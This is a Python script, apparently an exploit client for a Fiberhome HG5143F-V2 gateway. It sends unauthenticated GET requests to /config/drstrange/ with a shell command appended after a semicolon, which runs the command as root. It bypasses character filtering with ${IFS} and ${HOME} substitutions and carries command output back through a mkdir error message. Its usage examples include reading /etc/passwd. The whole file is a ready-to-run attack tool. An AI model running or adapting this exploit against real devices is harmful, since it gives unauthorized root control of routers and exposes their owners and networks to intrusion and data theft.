#!/usr/bin/env python3
"""
HG5143F-V2 (Fiberhome SDN gateway) shell-injection client.

Injection point: GET /config/drstrange/;<shell command>
The web server builds its CGI call as:  sh -c "ctapi sys get secret_iv ;<URL path>"
so a ';' in the path gives us command execution as root.

Only stderr is echoed back, so stdout is smuggled out as a mkdir argument.
No authentication required.

Usage:
    python onu_shell.py "id"
    python onu_shell.py "cat /etc/passwd"
"""
import socket
import sys

HOST = "192.168.1.1"
PORT = 80
TIMEOUT = 15

# markers so we can cut our stdout back out of mkdir's error message
MARK_B = "Bq7xK"
MARK_E = "Eq7xK"


def http_get(host, port, path, timeout=TIMEOUT):
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: RawHTTP/1.0\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n\r\n"
    )
    buf = b""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.sendall(req.encode())
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
    finally:
        s.close()
    return buf.decode("utf-8", "replace")


def encode(cmd):
    """URL-path escaping: space -> ${IFS}, slash -> ${HOME} (HOME is / here)."""
    return cmd.replace(" ", "${IFS}").replace("/", "${HOME}")


def run(cmd):
    # NB: fd-numbered redirections (2>) break -- after ${IFS} expansion the
    # token "2>file" is no longer parsed as a redirection. Standalone > and <
    # are still fine. For anything complex, base64 the script into a file.
    payload = f'mkdir -- "{MARK_B}$({cmd}){MARK_E}"'
    body = http_get(HOST, PORT, "/config/drstrange/;" + encode(payload))
    start = body.find(MARK_B)
    end = body.find(MARK_E, start + 1)
    if start < 0 or end < 0:
        return body
    return body[start + len(MARK_B):end]


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(2)
    sys.stdout.write(run(" ".join(sys.argv[1:])))
